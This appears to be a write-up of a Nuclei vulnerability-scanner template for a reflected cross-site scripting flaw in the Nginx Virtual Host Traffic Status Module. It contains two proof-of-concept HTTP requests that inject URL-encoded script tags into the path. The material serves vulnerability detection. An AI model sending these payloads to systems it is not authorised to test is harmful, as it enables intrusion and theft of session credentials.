# Nuclei Template: Nginx Virtual Host Traffic Status Module - Cross-Site Scripting
**Template ID:** nginx-module-vts-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`nginx-module-vts-xss.yaml`)

## Vulnerability Information & PoC

## Description
Nginx Virtual Host Traffic Status Module contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET /_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

GET /status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/vozlt/nginx-module-vts
